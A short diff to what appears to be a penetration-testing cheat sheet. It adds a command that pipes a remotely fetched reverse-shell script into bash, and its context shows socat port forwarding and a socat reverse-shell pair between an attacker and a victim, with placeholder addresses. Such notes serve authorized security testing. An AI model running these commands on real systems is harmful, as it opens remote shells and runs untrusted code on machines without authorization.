@@ -130,6 +130,8 @@ socat TCP-LISTEN:LOCAL-PORT,fork TCP:TARGET-IP:TARGET-PORT
 #https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
 # Reverse shell
+curl https://reverse-shell.sh/URIP:9000 | bash
+
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 
